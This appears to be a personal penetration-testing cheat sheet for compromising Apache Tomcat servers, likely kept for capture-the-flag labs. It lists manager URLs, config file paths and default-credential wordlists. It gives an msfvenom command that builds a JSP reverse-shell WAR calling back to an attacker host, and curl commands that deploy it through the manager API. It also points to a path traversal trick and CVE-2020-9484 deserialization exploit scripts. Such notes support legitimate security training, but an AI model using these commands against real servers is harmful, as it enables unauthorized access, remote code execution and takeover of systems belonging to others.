# tomcat

## Tomcat Files

```bash
# path
/manager/
/manager/status
/host-manager/

# main config paths
/etc/tomcat{X}
/usr/share/tomcat{X}/etc/
/etc/tomcat{X}/conf/
/etc/tomcat/conf/
C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\

# files
tomcat-users.xml
```

## Check for default creds using

use nikto to scan for default creds

```bash
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt 
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

## Shell

```bash
# via GUI
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war

## no gui, limited perms access
roles="admin-gui,manager-script"
As we don't have `manager-gui` permission, we cant login to manager-gui

https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#limitations
https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html

# generate .war shell
$ curl -u USER:'PASS' http://IP:PORT/manager/text/list
$ curl -u USER:'PASS' http://IP:PORT/manager/text/deploy?path=/kashz -T shell.war
$ curl -u USER:'PASS' http://IP:PORT/manager/text/undeploy?path=/kashz
```

## Tomcat/9.0.31

{% embed url="https://github.com/iamkashz/ctf-scripts/blob/main/HTB/monitors-tomcat-deserialization-rce.sh" %}

```bash
# Path Traversal via reverse proxy mapping
| Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/

# all version prior to April 2020
# CVE-2020-9484 | Deserialization of Untrusted Data RCE
| ROME method to generate .jar
    | ctf-scripts/tomcat-v9.0.31-deserialization-rce.sh (msf ripoff)
    | (msf) exploit/linux/http/apache_ofbiz_deserialiation
| CommonsCollections2 method to generate .jar
    | https://github.com/PenTestical/CVE-2020-9484 - uses 
    | manual: https://romnenko.medium.com/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4
```
